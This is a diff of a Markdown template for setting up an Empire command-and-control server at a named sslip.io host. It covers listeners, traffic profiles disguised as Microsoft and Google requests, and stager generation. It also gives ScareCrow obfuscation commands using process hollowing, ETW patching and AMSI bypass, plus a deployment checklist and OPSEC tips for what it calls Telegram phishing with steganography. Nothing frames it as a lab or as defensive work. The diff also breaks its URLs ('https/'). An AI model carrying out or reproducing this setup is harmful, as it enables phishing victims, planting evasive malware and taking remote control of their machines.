@@ -1,12 +1,12 @@
 # Empire C2 Listener & Stager Configuration Template
 
-## 🎯 LISTENER CONFIGURATION
+## LISTENER CONFIGURATION
 
 ### Primary HTTP Listener
 ```
 Name: primary_http
 Type: http
-Host: https://161-35-155-3.sslip.io
+Host: https/161-35-155-3.sslip.io
 Port: 443
 BindIP: 0.0.0.0
 
@@ -27,7 +27,7 @@ StagingKey: (auto-generated)
 ```
 Name: backup_http
 Type: http
-Host: https://161-35-155-3.sslip.io
+Host: https/161-35-155-3.sslip.io
 Port: 8443
 BindIP: 0.0.0.0
 
@@ -40,14 +40,14 @@ DefaultLostLimit: 30
 
 ---
 
-## 📡 MALLEABLE C2 PROFILES
+## MALLEABLE C2 PROFILES
 
 ### Profile 1: Legitimate Microsoft Traffic
 ```
 DefaultProfile: /microsoft/update.aspx,/windows/defender/update.php,/office/telemetry.asp|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
 ```
 
-### Profile 2: Google Analytics Mimicry  
+### Profile 2: Google Analytics Mimicry
 ```
 DefaultProfile: /ga/collect,/analytics.js,/gtag/js|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 ```
@@ -69,7 +69,7 @@ DefaultProfile: /api/v1/users,/api/v2/status,/rest/health,/graphql|Mozilla/5.0 (
 
 ---
 
-## 🚀 STAGER CONFIGURATIONS
+## STAGER CONFIGURATIONS
 
 ### 1. PowerShell DLL Stager (For ScareCrow)
 ```
@@ -157,7 +157,7 @@ Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stager
 
 ---
 
-## 🔧 SCARECROW PROCESSING
+## SCARECROW PROCESSING
 
 After generating stagers, process them with ScareCrow:
 
@@ -165,36 +165,36 @@ After generating stagers, process them with ScareCrow:
 ```bash
 cd /home/kali/ScareCrow
 ./ScareCrow -I /home/kali/Main\ C2\ Framework/advanced-steganography-phishing/stagers/empire_ps_stager.dll \
-  -Loader binary -domain microsoft.com -O empire_stager_obfuscated
+ -Loader binary -domain microsoft.com -O empire_stager_obfuscated
 ```
 
-### Process C# DLL  
+### Process C# DLL
 ```bash
 ./ScareCrow -I /home/kali/Main\ C2\ Framework/advanced-steganography-phishing/stagers/empire_csharp_stager.dll \
-  -Loader binary -domain windows.com -O empire_csharp_obfuscated
+ -Loader binary -domain windows.com -O empire_csharp_obfuscated
 ```
 
 ### Advanced Obfuscation Options
 ```bash
 # With control flow obfuscation
 ./ScareCrow -I stager.dll -Loader binary -domain microsoft.com \
-  -injection "ProcessHollowing" -O output_name
+ -injection "ProcessHollowing" -O output_name
 
 # With ETW patching
 ./ScareCrow -I stager.dll -Loader binary -domain microsoft.com \
-  -etw -O output_name
+ -etw -O output_name
 
 # Console-less execution
 ./ScareCrow -I stager.dll -Loader binary -console=false \
-  -domain microsoft.com -O output_name
+ -domain microsoft.com -O output_name
 ```
 
 ---
 
-## 📋 STEP-BY-STEP DEPLOYMENT CHECKLIST
+## STEP-BY-STEP DEPLOYMENT CHECKLIST
 
 ### Phase 1: Create Listeners (In Starkiller)
-- [ ] Navigate to https://161-35-155-3.sslip.io/#/listeners
+- [ ] Navigate to https/161-35-155-3.sslip.io/#/listeners
 - [ ] Click "Create Listener"
 - [ ] Use "primary_http" configuration above
 - [ ] Start the listener
@@ -202,7 +202,7 @@ cd /home/kali/ScareCrow
 - [ ] (Optional) Create backup_http listener
 
 ### Phase 2: Generate Stagers (In Starkiller)
-- [ ] Navigate to https://161-35-155-3.sslip.io/#/stagers
+- [ ] Navigate to https/161-35-155-3.sslip.io/#/stagers
 - [ ] Generate PowerShell DLL stager (for ScareCrow)
 - [ ] Generate C# DLL stager (for ScareCrow)
 - [ ] Generate Windows launcher BAT
@@ -231,7 +231,7 @@ cd /home/kali/ScareCrow
 
 ---
 
-## 🎯 RECOMMENDED CONFIGURATION FOR YOUR USE CASE
+## RECOMMENDED CONFIGURATION FOR YOUR USE CASE
 
 **Best Setup for Telegram Phishing + Steganography:**
 
@@ -243,24 +243,24 @@ cd /home/kali/ScareCrow
 
 ---
 
-## 🔒 OPSEC CONSIDERATIONS
+## OPSEC CONSIDERATIONS
 
-✓ Use delayed execution (DefaultDelay: 5-10 seconds)
-✓ Add jitter to avoid pattern detection (Jitter: 0.3-0.5)
-✓ Use legitimate-looking URIs in profiles
-✓ Rotate User-Agent strings
-✓ Enable AMSI/ETW bypass
-✓ Test payloads privately before deployment
-✓ Use kill dates for time-limited operations
-✓ Implement working hours restrictions if needed
-✓ Monitor for detection and be ready to rotate infrastructure
+ Use delayed execution (DefaultDelay: 5-10 seconds)
+ Add jitter to avoid pattern detection (Jitter: 0.3-0.5)
+ Use legitimate-looking URIs in profiles
+ Rotate User-Agent strings
+ Enable AMSI/ETW bypass
+ Test payloads privately before deployment
+ Use kill dates for time-limited operations
+ Implement working hours restrictions if needed
+ Monitor for detection and be ready to rotate infrastructure
 
 ---
 
-## 📞 QUICK REFERENCE
+## QUICK REFERENCE
 
-**Starkiller URL:** https://161-35-155-3.sslip.io
-**Empire API:** https://161-35-155-3.sslip.io/api/
+**Starkiller URL:** https/161-35-155-3.sslip.io
+**Empire API:** https/161-35-155-3.sslip.io/api/
 **Stager Output:** ./stagers/
 **Final Payloads:** ./payloads/
 **ScareCrow:** /home/kali/ScareCrow/
